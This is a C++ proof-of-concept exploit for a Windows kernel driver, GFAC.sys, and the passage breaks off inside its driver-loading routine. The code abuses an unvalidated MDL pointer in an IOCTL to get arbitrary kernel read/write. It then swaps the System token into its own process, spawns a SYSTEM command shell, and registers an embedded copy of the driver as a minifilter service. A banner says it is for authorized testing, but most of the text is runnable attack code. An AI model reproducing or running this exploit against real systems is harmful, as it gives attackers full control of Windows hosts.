// ============================================================================
//  GFAC.sys local privilege-escalation PoC  (RESEARCH / AUTHORIZED TESTING ONLY)
// ----------------------------------------------------------------------------
//  Target : GFAC.sys  (md5 756873c861d94e4e78341da5ce7c0ea1)
//  Bug    : IOCTL 0x222000 ("MapUserBuffer", IoctlMapUserBuffer @ 0x140005E20)
//           reads a RAW MDL POINTER from the caller-supplied 48-byte input
//           buffer (offset +0x10) and feeds it, without any validation, to
//           MmMapLockedPagesSpecifyCache / MmProtectMdlSystemAddress.
//           The caller also controls AccessMode (0=kernel,1=user) and
//           RequestedAddress, so a forged MDL whose PFN array points at
//           arbitrary physical frames can be mapped into the caller's own
//           user address space  ->  user-mode R/W of arbitrary physical memory.
//
//  NOTE: This is a static-analysis-derived PoC. The mapping primitive and the
//        SYSTEM-token escalation MUST be validated on the target build; see
//        README.md. Offsets inside EPROCESS are build dependent.
// ============================================================================
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <winsvc.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

// ----------------------------------------------------------------------------
//  IOCTL interface  (device type 0x22, METHOD_BUFFERED, FILE_ANY_ACCESS)
//    handler table g_IoctlHandlerTable @ 0x140008478:
//      idx0 (func 0x800) -> IoctlMapUserBuffer   @ 0x140005E20
//      idx1 (func 0x801) -> IoctlUnmapUserBuffer @ 0x140005F70
//      idx2 (func 0x802) -> IoctlGetVersion      @ 0x140005DE0
// ----------------------------------------------------------------------------
#define GFAC_DEVICE_SYMLINK      L"\\\\.\\GFAC"

#define GFAC_IOCTL_MAP_USER_BUFFER   0x222000   // CTL_CODE(0x22,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define GFAC_IOCTL_UNMAP_USER_BUFFER 0x222004   // CTL_CODE(0x22,0x801,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define GFAC_IOCTL_GET_VERSION       0x222008   // CTL_CODE(0x22,0x802,METHOD_BUFFERED,FILE_ANY_ACCESS)

#pragma pack(push, 8)   // natural alignment matches the driver's stack struct
// Exact 48-byte request expected by IoctlMapUserBuffer (input length must be 48,
// output length must be 8).  Field offsets verified from disassembly @0x140005E20:
//   +0x18 LockPages, +0x19..0x1B pad, +0x1C AccessMode, +0x1D..0x1F pad
struct GFAC_MAP_REQUEST {
    uint64_t ProcessId1;        // +0x00  target proc (0 == current -> skipped)
    uint64_t ProcessId2;        // +0x08  source proc (0 == current -> skipped)
    uint64_t Mdl;               // +0x10  >>> RAW MDL POINTER (unvalidated) <<<
    uint8_t  LockPages;         // +0x18  a5: 1 = MmProbeAndLockPages, 0 = skip
    uint8_t  _pad0[3];          // +0x19
    uint8_t  AccessMode;        // +0x1C  0 = KernelMode, 1 = UserMode
    uint8_t  _pad1[3];          // +0x1D
    uint32_t NewProtect;        // +0x20  -> MmProtectMdlSystemAddress
    uint32_t CacheType;         // +0x24  MEMORY_CACHING_TYPE
    uint64_t RequestedAddress;  // +0x28  used only when AccessMode == 1 (0 => kernel picks)
};                              // == 48 bytes
#pragma pack(pop)

#pragma pack(push, 8)
// Unmap request - InputBufferLength must be 24 (only first 16 bytes are read).
struct GFAC_UNMAP_REQUEST {
    uint64_t BaseAddress;       // +0x00
    uint64_t Mdl;               // +0x08
    uint64_t _reserved;         // +0x10  unused, pads the request to 24 bytes
};
#pragma pack(pop)

static_assert(sizeof(GFAC_MAP_REQUEST)   == 48, "map request must be exactly 48 bytes");
static_assert(sizeof(GFAC_UNMAP_REQUEST) == 24, "unmap request must be exactly 24 bytes");

// MDL flag bits (wdm.h)
#define MDL_MAPPED_TO_SYSTEM_VA     0x0001
#define MDL_PAGES_LOCKED            0x0002
#define MDL_SOURCE_IS_NONPAGED_POOL 0x0004
#define MDL_ALLOCATED_FIXED_SIZE    0x0008

#pragma pack(push, 8)
// Forged _MDL laid out exactly like the kernel structure (x64), followed by the
// PFN array that MmMapLockedPagesSpecifyCache consumes.
struct FAKE_MDL {
    FAKE_MDL* Next;             // +0x00
    uint16_t  Size;             // +0x08  must equal sizeof(MDL) so PFN array == this+Size
    uint16_t  MdlFlags;         // +0x0A
    uint32_t  Reserved;         // +0x0C
    void*     Process;          // +0x10
    void*     MappedSystemVa;   // +0x18
    void*     StartVa;          // +0x20
    uint32_t  ByteCount;        // +0x28  number of bytes described
    uint32_t  ByteOffset;       // +0x2C
    uint64_t  Pfn[1];           // +0x30  PFN array (physical page numbers)
};
#pragma pack(pop)
#define GFAC_MDL_SIZE 0x30

// ----------------------------------------------------------------------------
//  Low level driver helpers
// ----------------------------------------------------------------------------
static HANDLE OpenGfac(void) {
    HANDLE h = CreateFileW(GFAC_DEVICE_SYMLINK, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                           OPEN_EXISTING, 0, nullptr);
    return (h == INVALID_HANDLE_VALUE) ? nullptr : h;
}

// IOCTL 0x802 : sanity check the interface (returns magic 0x539)
static bool GfacGetVersion(HANDLE h, uint32_t* out) {
    uint32_t in = 0, info = 0, ver = 0;
    BOOL ok = DeviceIoControl(h, GFAC_IOCTL_GET_VERSION, &in, sizeof(in),
                              &ver, sizeof(ver), (LPDWORD)&info, nullptr);
    if (out) *out = ver;
    return ok && ver == 0x539;
}

// IOCTL 0x800 (MapUserBuffer) is issued by MapKernelRange() below.

// IOCTL 0x801 : unmap (also takes a raw MDL pointer -> same class of bug)
static bool GfacUnmapForgedMdl(HANDLE h, FAKE_MDL* mdl, void* base) {
    GFAC_UNMAP_REQUEST req = {};
    req.BaseAddress = (uint64_t)base;
    req.Mdl         = (uint64_t)mdl;
    DWORD info = 0;
    return DeviceIoControl(h, GFAC_IOCTL_UNMAP_USER_BUFFER,
                           &req, sizeof(req), nullptr, 0, &info, nullptr) != 0;
}

// ----------------------------------------------------------------------------
//  The primitive: map an arbitrary KERNEL VA range into our own address space
// ----------------------------------------------------------------------------
//  Two hard requirements for a *stable* forged MDL (learned from the 0x4E):
//    * Mdl->Size MUST be sizeof(MDL) + pages*8, because
//        MmGetMdlPfnArray(Mdl) = Mdl + Mdl->Size - pages*8.
//      Using 0x30 made the kernel read its PFN array from BEFORE the MDL ->
//      garbage PFNs -> MiDoubleUnlockMdlPage -> PFN_LIST_CORRUPT (0x4E).
//    * Let the DRIVER lock the MDL (LockPages = 1). It calls
//      MmProbeAndLockPages(Mdl, KernelMode, IoReadAccess), which fills the PFN
//      array for [StartVa+ByteOffset, +ByteCount) and keeps the page reference
//      counts consistent (forging PFNs ourselves makes the user-space mapping
//      bookkeeping underflow).
//
//  With StartVa set to a *kernel* VA this yields user-mode read/write of
//  arbitrary kernel virtual memory.
struct KernelMap {
    void*     userVa;   // user VA the kernel range is mapped at
    FAKE_MDL* mdl;
    uint64_t  kva;      // page-aligned kernel VA that userVa corresponds to
    size_t    size;
};

static bool MapKernelRange(HANDLE h, uint64_t kva, size_t size, KernelMap* out) {
    uint64_t base  = kva & ~(uint64_t)0xFFF;
    size_t   off   = (size_t)(kva - base);
    size_t   pages = ((off + size) + 0xFFF) >> 12;

    size_t need  = GFAC_MDL_SIZE + pages * sizeof(uint64_t);
    size_t alloc = (need + 0xFFF) & ~(size_t)0xFFF;
    auto* mdl = (FAKE_MDL*)VirtualAlloc(nullptr, alloc, MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE);
    if (!mdl) return false;
    ZeroMemory(mdl, alloc);

    mdl->Next           = nullptr;
    mdl->Size           = (uint16_t)need;   // <<< FIX: sizeof(MDL) + pages*8
    mdl->MdlFlags       = 0;                // MmProbeAndLockPages sets PAGES_LOCKED
    mdl->Process        = nullptr;
    mdl->MappedSystemVa = nullptr;
    mdl->StartVa        = (void*)base;      // kernel VA to lock
    mdl->ByteCount      = (uint32_t)size;
    mdl->ByteOffset     = (uint32_t)off;

    GFAC_MAP_REQUEST req{};
    req.ProcessId1 = 0;                     // current process
    req.ProcessId2 = 0;
    req.Mdl        = (uint64_t)mdl;
    req.LockPages  = 1;                     // driver locks the MDL for us
    req.AccessMode = 1;                     // UserMode -> map into our VA space
    req.NewProtect = PAGE_READWRITE;
    req.CacheType  = 0;
    req.RequestedAddress = 0;               // kernel picks a free user VA

    uint64_t mapped = 0; DWORD info = 0;
    if (!DeviceIoControl(h, GFAC_IOCTL_MAP_USER_BUFFER, &req, sizeof(req),
                         &mapped, sizeof(mapped), &info, nullptr) || !mapped) {
        printf("    ! map failed (pages=%zu gle=%lu)\n", pages, GetLastError());
        VirtualFree(mdl, 0, MEM_RELEASE);
        return false;
    }
    out->userVa = (void*)mapped;
    out->mdl    = mdl;
    out->kva    = base;
    out->size   = size;
    return true;
}

// Tear a mapping down. The driver locked the MDL with MmProbeAndLockPages, so
// MmUnmapLockedPages + MmUnlockPages (IOCTL 0x801) should be the balanced pair.
// Set GFAC_KEEP_MAPPINGS=1 to skip it instead (the read count is now small, so
// leaking a handful of mappings is harmless and removes a class of risk).
#define GFAC_KEEP_MAPPINGS 1

static void UnmapKernelRange(HANDLE h, KernelMap* km) {
#if GFAC_KEEP_MAPPINGS
    (void)h; (void)km;
#else
    if (!km->userVa) return;
    GfacUnmapForgedMdl(h, km->mdl, km->userVa);
    VirtualFree(km->mdl, 0, MEM_RELEASE);
    km->userVa = nullptr;
#endif
}

// Arbitrary kernel virtual read/write (map -> touch -> unmap).
//
// Each mapping is CAPPED at ONE page: multi-page MDLs come back only partially
// valid (the names table read returned a 46 MB RVA for names[3357], i.e. garbage
// past the first page), so bigger reads are split into 4 KiB chunks.
#define GFAC_MAX_MAP 0x1000         // 1 page

static bool KRead(HANDLE h, uint64_t kva, void* dst, size_t len) {
    uint8_t* p = (uint8_t*)dst;
    while (len) {
        size_t chunk = len > GFAC_MAX_MAP ? GFAC_MAX_MAP : len;
        KernelMap km{};
        if (!MapKernelRange(h, kva, chunk, &km)) return false;
        __try {
            // km.userVa already points at `kva` (the driver returns the mapping
            // of Mdl->StartVa + Mdl->ByteOffset), so do NOT add the page offset
            // again - doing so read past the mapping (0xC0000005).
            memcpy(p, km.userVa, chunk);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("    ! fault: kva=0x%llx va=%p\n", (unsigned long long)kva,
                   km.userVa);
            return false;
        }
        UnmapKernelRange(h, &km);
        p += chunk; kva += chunk; len -= chunk;
    }
    return true;
}

static bool KWrite(HANDLE h, uint64_t kva, const void* src, size_t len) {
    const uint8_t* p = (const uint8_t*)src;
    while (len) {
        size_t chunk = len > GFAC_MAX_MAP ? GFAC_MAX_MAP : len;
        KernelMap km{};
        if (!MapKernelRange(h, kva, chunk, &km)) return false;
        __try {
            memcpy(km.userVa, p, chunk);   // km.userVa already == &kva
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("    ! fault writing kva=0x%llx\n", (unsigned long long)kva);
            return false;
        }
        UnmapKernelRange(h, &km);
        p += chunk; kva += chunk; len -= chunk;
    }
    return true;
}

// ----------------------------------------------------------------------------
//  Escalation: SYSTEM token steal via arbitrary kernel R/W
// ----------------------------------------------------------------------------
//  Only EPROCESS.Token is hard-coded (build dependent); the other offsets are
//  self-calibrated at runtime from the live System EPROCESS.
#define OFF_TOKEN 0x4b8

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags;
    USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount;
    USHORT OffsetToFileName; UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;
typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
static PFN_NtQuerySystemInformation g_NtQSI = nullptr;

static uint64_t g_kernelBase = 0;
static uint32_t g_kernelSize = 0;

static bool EnablePrivilege(const wchar_t* name);   // defined in the loader section

typedef BOOL (WINAPI *PFN_EnumDeviceDrivers)(LPVOID*, DWORD, LPDWORD);

// Fallback: EnumDeviceDrivers() lists loaded kernel modules; entry 0 is normally
// ntoskrnl. Used when NtQuerySystemInformation(SystemModuleInformation) fails.
static uint64_t GetKernelBaseFallback(void) {
    HMODULE k = GetModuleHandleW(L"kernel32.dll");
    if (!k) return 0;
    auto f = (PFN_EnumDeviceDrivers)GetProcAddress(k, "K32EnumDeviceDrivers");
    if (!f) f = (PFN_EnumDeviceDrivers)GetProcAddress(k, "EnumDeviceDrivers");
    if (!f) return 0;
    LPVOID bases[1024]{};
    DWORD need = 0;
    if (!f(bases, sizeof(bases), &need) || !bases[0]) return 0;
    return (uint64_t)bases[0];
}

// Recover SizeOfImage straight from the mapped image (needed to bound the export
// RVAs we are willing to hand to the driver).
static uint32_t SizeOfImageFromHeader(HANDLE h, uint64_t base) {
    uint8_t hdr[0x200];
    if (!KRead(h, base, hdr, sizeof(hdr))) return 0;
    if (*(uint16_t*)hdr != 0x5A4D) return 0;
    uint32_t lfanew = *(uint32_t*)(hdr + 0x3C);
    if (lfanew + 0x60 > sizeof(hdr)) return 0;
    return *(uint32_t*)(hdr + lfanew + 0x50);          // OptionalHeader.SizeOfImage
}

static uint64_t GetNtoskrnlBase(HANDLE h) {
    EnablePrivilege(L"SeDebugPrivilege");
    if (!g_NtQSI) {
        HMODULE nt = GetModuleHandleW(L"ntdll.dll");
        if (nt) g_NtQSI = (PFN_NtQuerySystemInformation)
                          GetProcAddress(nt, "NtQuerySystemInformation");
    }
    if (g_NtQSI) {
        ULONG len = 0;
        NTSTATUS st1 = g_NtQSI((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &len);
        printf("    ! NtQSI#1 st=0x%08lx len=%lu\n", (unsigned long)st1, len);
        if (len == 0 || len > 0x800000) len = 0x80000;     // sanity bound
        std::vector<uint8_t> buf((size_t)len + 0x1000);
        NTSTATUS st2 = g_NtQSI((SYSTEM_INFORMATION_CLASS)11, buf.data(),
                               (ULONG)buf.size(), &len);
        printf("    ! NtQSI#2 st=0x%08lx len=%lu\n", (unsigned long)st2, len);
        if (st2 == 0) {
            auto* mods = (RTL_PROCESS_MODULES*)buf.data();
            printf("    ! modules=%lu\n", mods->NumberOfModules);
            for (ULONG i = 0; i < mods->NumberOfModules; i++) {
                const char* p = (const char*)mods->Modules[i].FullPathName
                                + mods->Modules[i].OffsetToFileName;
                if (i < 3)
                    printf("    ! mod[%lu] '%s' base=0x%llx size=0x%x\n", i, p,
                           (unsigned long long)mods->Modules[i].ImageBase,
                           mods->Modules[i].ImageSize);
                if (_stricmp(p, "ntoskrnl.exe") == 0) {
                    g_kernelSize = mods->Modules[i].ImageSize;
                    g_kernelBase = (uint64_t)mods->Modules[i].ImageBase;
                    return g_kernelBase;
                }
            }
            printf("    ! ntoskrnl.exe not in module list\n");
        }
    } else {
        printf("    ! NtQuerySystemInformation unavailable\n");
    }

    uint64_t b = GetKernelBaseFallback();
    if (b) {
        printf("    ! fallback EnumDeviceDrivers base=0x%llx\n", (unsigned long long)b);
        g_kernelBase = b;
        uint32_t sz = SizeOfImageFromHeader(h, b);
        g_kernelSize = sz ? sz : 0x2000000;
        printf("    ! fallback SizeOfImage=0x%x\n", g_kernelSize);
        return b;
    }
    return 0;
}

// A VA is only safe to hand to the driver if it is known mapped. The kernel
// image is always mapped; anything else must be a pointer we trust (see the
// ActiveProcessLinks walk, which only follows real list pointers).

// Resolve an export by reading the export tables in bulk (a handful of mappings
// instead of ~2 per name - the per-name version leaked thousands of mappings
// and killed the process).
static uint64_t ResolveExport(HANDLE h, uint64_t base, const char* name) {
    uint8_t hdr[0x400];
    if (!KRead(h, base, hdr, sizeof(hdr))) { printf("    ! PE header read failed\n"); return 0; }
    if (*(uint16_t*)hdr != 0x5A4D) { printf("    ! not PE (0x%04x)\n", *(uint16_t*)hdr); return 0; }
    uint32_t e_lfanew = *(uint32_t*)(hdr + 0x3C);
    if (e_lfanew + 0x90 > sizeof(hdr)) { printf("    ! e_lfanew=0x%x\n", e_lfanew); return 0; }
    uint32_t expRva = *(uint32_t*)(hdr + e_lfanew + 0x88);   // DataDirectory[0].VA
    if (!expRva) { printf("    ! no export directory\n"); return 0; }

    uint8_t ed[0x28];
    if (!KRead(h, base + expRva, ed, sizeof(ed))) { printf("    ! export dir read failed\n"); return 0; }
    uint32_t numNames = *(uint32_t*)(ed + 0x18);
    uint32_t funcsRva = *(uint32_t*)(ed + 0x1C);
    uint32_t namesRva = *(uint32_t*)(ed + 0x20);
    uint32_t ordsRva  = *(uint32_t*)(ed + 0x24);
    printf("    export dir +0x%x: %u names, funcs+0x%x names+0x%x ords+0x%x\n",
           expRva, numNames, funcsRva, namesRva, ordsRva);
    if (numNames == 0 || numNames > 0x20000) return 0;

    std::vector<uint32_t> names(numNames);
    std::vector<uint16_t> ords(numNames);

    printf("    reading name-pointer table (%u bytes)...\n", numNames * 4);
    if (!KRead(h, base + namesRva, names.data(), numNames * 4)) {
        printf("    ! names table read failed\n"); return 0;
    }
    printf("    names[0]=0x%x names[%u]=0x%x\n", names[0], numNames - 1,
           names[numNames - 1]);

    printf("    reading ordinal table (%u bytes)...\n", numNames * 2);
    if (!KRead(h, base + ordsRva, ords.data(), numNames * 2)) {
        printf("    ! ordinals read failed\n"); return 0;
    }
    printf("    ordinals OK\n");

    // The name-pointer table is sorted (PE spec) -> binary search with a handful
    // of small reads instead of pulling a huge blob (which exceeds the mapping
    // size limit).
    uint32_t lo = 0, hi = numNames;
    while (lo < hi) {
        uint32_t mid = lo + (hi - lo) / 2;
        uint32_t rva = names[mid];
        if (rva >= g_kernelSize) {   // never hand an out-of-image VA to the driver
            printf("    ! bad name RVA 0x%x at index %u - aborting\n", rva, mid);
            return 0;
        }
        printf("    probe mid=%u rva=0x%x\n", mid, rva);
        char nm[64]{};
        if (!KRead(h, base + rva, nm, sizeof(nm) - 1)) {
            printf("    ! name read failed\n"); return 0;
        }
        int c = strcmp(nm, name);
        if (c == 0) {
            uint32_t fr = 0;
            if (funcsRva + ords[mid] * 4 + 4 > g_kernelSize) return 0;
            if (!KRead(h, base + funcsRva + ords[mid] * 4, &fr, 4)) return 0;
            return base + fr;
        }
        if (c < 0) lo = mid + 1; else hi = mid;
    }
    printf("    ! '%s' not found in export names\n", name);
    return 0;
}

static void GetOwnImageName(char* out, size_t n) {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring w(path);
    size_t s = w.find_last_of(L"\\/");
    if (s != std::wstring::npos) w = w.substr(s + 1);
    size_t i = 0;
    for (; i < w.size() && i < n - 1; i++) out[i] = (char)w[i];
    out[i] = 0;
}

// EPROCESS field offsets differ per build, so they are calibrated at runtime
// from the live System EPROCESS (reference values for 22H2 were UPI=0x440,
// ActiveProcessLinks=0x448, Token=0x4b8, ImageFileName=0x5a8).
static bool SafeKernelPtr(uint64_t p) {
    // Any canonical kernel address is a candidate (EPROCESS links live in the
    // pool). The previous upper bound 0xffffc00000000000 wrongly rejected the
    // kernel image at 0xfffff802..., which is where PsActiveProcessHead sits.
    return p >= 0xFFFF800000000000ull && (p & 7) == 0;
}

static bool StealTokenViaKernelRW(HANDLE h) {
    uint64_t kbase = GetNtoskrnlBase(h);
    if (!kbase) { printf("[-] ntoskrnl base not found\n"); return false; }
    printf("[+] ntoskrnl base = 0x%llx (size 0x%x)\n",
           (unsigned long long)kbase, g_kernelSize);

    uint64_t psisp = ResolveExport(h, kbase, "PsInitialSystemProcess");
    if (!psisp) { printf("[-] PsInitialSystemProcess not resolved\n"); return false; }
    printf("[+] PsInitialSystemProcess @ 0x%llx\n", (unsigned long long)psisp);

    uint64_t sysEproc = 0;
    if (!KRead(h, psisp, &sysEproc, sizeof(sysEproc)) || !SafeKernelPtr(sysEproc)) {
        printf("[-] cannot read PsInitialSystemProcess\n"); return false;
    }
    printf("[+] System EPROCESS = 0x%llx\n", (unsigned long long)sysEproc);

    // The EPROCESS is one mapped allocation, so dumping it is safe.
    uint8_t dump[0x1000];
    if (!KRead(h, sysEproc, dump, sizeof(dump))) {
        printf("[-] EPROCESS dump failed\n"); return false;
    }

    // 1) ImageFileName: the literal "System" inside the EPROCESS.
    int nameOff = -1;
    for (int i = 0; i + 7 < (int)sizeof(dump); i++)
        if (memcmp(dump + i, "System\0", 7) == 0) { nameOff = i; break; }
    if (nameOff < 0) { printf("[-] ImageFileName not found in EPROCESS\n"); return false; }

    // 2) UniqueProcessId + ActiveProcessLinks. On every recent build these are
    //    adjacent: a HANDLE holding 4 followed by the LIST_ENTRY. Requiring both
    //    list pointers to be kernel VAs pins the pair down exactly, whereas a
    //    plain "dword 4" search picks up false positives.
    int pidOff = -1, linksOff = -1;
    for (int o = 0x100; o + 24 <= nameOff; o += 8) {
        if (*(uint64_t*)(dump + o) != 4) continue;
        uint64_t f = *(uint64_t*)(dump + o + 8);
        uint64_t b = *(uint64_t*)(dump + o + 16);
        if (SafeKernelPtr(f) && SafeKernelPtr(b) && f != b) {
            pidOff = o; linksOff = o + 8; break;
        }
    }
    if (pidOff < 0) {                      // fallback: plain dword-4 search
        for (int o = nameOff - 8; o >= 0x100; o -= 4)
            if (*(uint32_t*)(dump + o) == 4) { pidOff = o; linksOff = o + 8; break; }
    }
    if (pidOff < 0) { printf("[-] UniqueProcessId not found\n"); return false; }
    printf("[+] calibrated: ImageFileName=0x%x UniqueProcessId=0x%x ActiveProcessLinks=0x%x\n",
           nameOff, pidOff, linksOff);

    // 4) Walk the real process list to our EPROCESS. Every VA comes from a list
    //    pointer, so every read is of mapped memory (no bugcheck).
    char own[16]{}; GetOwnImageName(own, sizeof(own));
    uint32_t myPid = GetCurrentProcessId();
    printf("[i] our pid=%u image='%s'\n", myPid, own);
    uint64_t myEproc = 0;
    uint64_t link = sysEproc + linksOff;
    int hops = 0;
    for (; hops < 8192; hops++) {
        uint64_t flink = 0;
        if (!KRead(h, link, &flink, 8)) {
            printf("    ! hop %d read failed\n", hops); break;
        }
        // A link pointing into the kernel image is PsActiveProcessHead -> end.
        if (flink >= g_kernelBase && flink < g_kernelBase + g_kernelSize) {
            printf("    list end after %d hops (head=0x%llx)\n", hops,
                   (unsigned long long)flink);
            break;
        }
        if (!SafeKernelPtr(flink)) {
            printf("    ! hop %d flink=0x%llx not a kernel ptr\n", hops,
                   (unsigned long long)flink);
            break;
        }
        uint64_t proc = flink - linksOff;
        if (proc == sysEproc) { printf("    list wrapped after %d hops\n", hops); break; }
        uint32_t pid = 0; char pn[16]{};
        KRead(h, proc + pidOff, &pid, 4);
        KRead(h, proc + nameOff, pn, sizeof(pn) - 1);
        bool pidHit  = (pid == myPid);
        bool nameHit = (strncmp(pn, own, 4) == 0);
        if (hops < 10 || hops > 125 || pidHit || nameHit)
            printf("    hop %d: proc=0x%llx pid=%u name='%s'%s%s\n", hops,
                   (unsigned long long)proc, pid, pn,
                   pidHit ? "  <PID>" : "", nameHit ? "  <NAME>" : "");
        // The PID is authoritative (the list PIDs are all sane, which confirms
        // UniqueProcessId); the name is only used for reporting.
        if (pidHit) { myEproc = proc; break; }
        link = flink;
    }
    if (!myEproc) {
        printf("[-] our EPROCESS not found (image '%s', pid %u)\n", own, myPid);
        return false;
    }
    printf("[+] our EPROCESS = 0x%llx\n", (unsigned long long)myEproc);

    // 5) Token: the EX_FAST_REF in the EPROCESS whose target is a _TOKEN whose
    //    TokenSource name is "*SYSTEM*". Identifies the offset and the token.
    int tokenOff = -1; uint64_t sysToken = 0;
    for (int t = pidOff + 0x50; t <= pidOff + 0xA0; t += 8) {
        uint64_t v = *(uint64_t*)(dump + t);
        if (!SafeKernelPtr(v & ~0xFULL)) continue;
        char src[9]{};
        if (!KRead(h, v & ~0xFULL, src, 8)) continue;
        if (memcmp(src, "*SYSTEM*", 8) == 0) { tokenOff = t; sysToken = v; break; }
    }
    if (tokenOff < 0) { printf("[-] token offset not found\n"); return false; }
    printf("[+] Token offset=0x%x (System token 0x%llx)\n", tokenOff,
           (unsigned long long)sysToken);

    uint64_t newToken = sysToken & ~0xFULL;              // drop EX_FAST_REF refcount
    if (!KWrite(h, myEproc + tokenOff, &newToken, 8)) {
        printf("[-] token write failed\n"); return false;
    }
    uint64_t check = 0; KRead(h, myEproc + tokenOff, &check, 8);
    if ((check & ~0xFULL) != newToken) {
        printf("[-] token write did not stick\n"); return false;
    }
    printf("[+] token swapped -> this process is now SYSTEM\n");
    return true;
}

// SEH wrapper: a user-mode fault prints the exception instead of killing the
// process silently (which is what made the last run "finish abruptly").
static bool RunEscalation(HANDLE h) {
    __try {
        return StealTokenViaKernelRW(h);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] user-mode exception 0x%08lx during escalation\n",
               GetExceptionCode());
        return false;
    }
}

// Spawn a SYSTEM console (inherits our (now SYSTEM) token).
static void SpawnSystemShell(void) {
    STARTUPINFOW si{}; PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    WCHAR cmd[] = L"cmd.exe /k title SYSTEM_POC";
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE,
                       nullptr, nullptr, &si, &pi)) {
        printf("[+] launched SYSTEM shell pid=%lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess failed gle=%lu\n", GetLastError());
    }
}

// ----------------------------------------------------------------------------
//  Embedded driver loader
//    GFAC.sys is a FltMgr minifilter: FltRegisterFilter/FltStartFiltering need
//    the service key to carry a load-order Group, DependOnService=FltMgr and an
//    Instances\<inst>\Altitude value.  A plain "sc create/start" omits those,
//    which is why the driver does not load on its own.
// ----------------------------------------------------------------------------
#define IDR_GFAC_DRIVER   101                 // must match GFAC_LPE_PoC.rc
#define GFAC_SERVICE      L"GFAC"
#define GFAC_ALTITUDE     L"389020"           // any unique FSFilter altitude
#define GFAC_LOAD_GROUP   L"FSFilter Activity Monitor"
#define GFAC_SYS_NAME     L"GFAC.sys"

static bool EnablePrivilege(const wchar_t* name) {
    HANDLE tok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;
    LUID luid{}; bool ok = false;
    if (LookupPrivilegeValueW(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr)
             && GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(tok);
    return ok;
}

// Pull GFAC.sys out of the PE resource section into %TEMP%.
static std::wstring ExtractEmbeddedDriver(void) {
    HRSRC r = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_GFAC_DRIVER),
                            (LPCWSTR)RT_RCDATA);
    if (!r) return L"";
    DWORD sz = SizeofResource(nullptr, r);
    HGLOBAL g = LoadResource(nullptr, r);
    void* p = g ? LockResource(g) : nullptr;
    if (!p || !sz) return L"";

    wchar_t tmp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, tmp);
    std::wstring path = std::wstring(tmp) + GFAC_SYS_NAME;

    HANDLE f = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return L"";
    DWORD w = 0;
    BOOL ok = WriteFile(f, p, sz, &w, nullptr);
    CloseHandle(f);
    if (!ok || w != sz) return L"";
    printf("[+] extracted embedded driver -> %ls (%lu bytes)\n", path.c_str(), sz);
    return path;
}

static bool RegWrite(HKEY root, const wchar_t* sub, const wchar_t* name,
                     DWORD type, const void* data, DWORD cb) {
    HKEY k = nullptr;
    if (RegCreateKeyExW(root, sub, 0, nullptr, 0, KEY_SET_VALUE,
                        nullptr, &k, nullptr) != ERROR_SUCCESS)
        return false;
    LONG r = RegSetValueExW(k, name, 0, type, (const BYTE*)data, cb);
    RegCloseKey(k);
    return r == ERROR_SUCCESS;
}

// Register the minifilter metadata FltMgr needs before it will start the filter.
static void SetupMinifilterRegistry(void) {
    const wchar_t* base = L"SYSTEM\\CurrentControlSet\\Services\\" GFAC_SERVICE;
    std::wstring instKey = std::wstring(base) + L"\\Instances";
    std::wstring defKey  = instKey + L"\\" GFAC_SERVICE;

    const wchar_t* defInst = GFAC_SERVICE;
    RegWrite(HKEY_LOCAL_MACHINE, instKey.c_str(), L"DefaultInstance",
             REG_SZ, defInst, (DWORD)((wcslen(defInst) + 1) * sizeof(wchar_t)));

    const wchar_t* altitude = GFAC_ALTITUDE;
    RegWrite(HKEY_LOCAL_MACHINE, defKey.c_str(), L"Altitude",
             REG_SZ, altitude, (DWORD)((wcslen(altitude) + 1) * sizeof(wchar_t)));

    DWORD flags = 0;
    RegWrite(HKEY_LOCAL_MACHINE, defKey.c_str(), L"Flags",
             REG_DWORD, &flags, sizeof(flags));
}

// Create + start the kernel service that hosts the driver.
static bool InstallAndStartDriver(const std::wstring& sysPath) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        printf("[-] OpenSCManager failed gle=%lu (run elevated)\n", GetLastError());
        return false;
    }
    SC_HANDLE old = OpenServiceW(scm, GFAC_SERVICE, SERVICE_ALL_ACCESS);
    if (old) {
        SERVICE_STATUS st{};
        ControlService(old, SERVICE_CONTROL_STOP, &st);
        DeleteService(old);
        CloseServiceHandle(old);
    }
    SC_HANDLE svc = CreateServiceW(
